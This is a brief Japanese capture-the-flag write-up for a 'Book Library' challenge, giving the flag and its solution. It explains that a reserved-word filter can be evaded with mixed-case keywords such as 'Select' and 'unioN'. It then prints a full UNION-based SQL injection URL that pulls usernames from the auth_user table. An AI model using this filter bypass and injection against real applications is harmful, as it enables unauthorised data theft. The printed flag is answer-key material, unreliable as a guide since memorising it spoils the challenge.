## Book Library
管理者アカウントのusernameがFlagです

## 配布物
なし

## Flag
pgctf{cocoro_ga_pyonpyon}

## Writeup
`SELECT`や`select`、`UNION`や`union`といったいくつかの予約語が含まれていると403になるが、大文字小文字を両方含めた`Select`や`unioN`は通るので普通にSQL Injectionする
`http://localhost:8000/?title=' Union Select 1,username,3,4,current_date,6,7,current_timestamp,current_timestamp From auth_user -- `
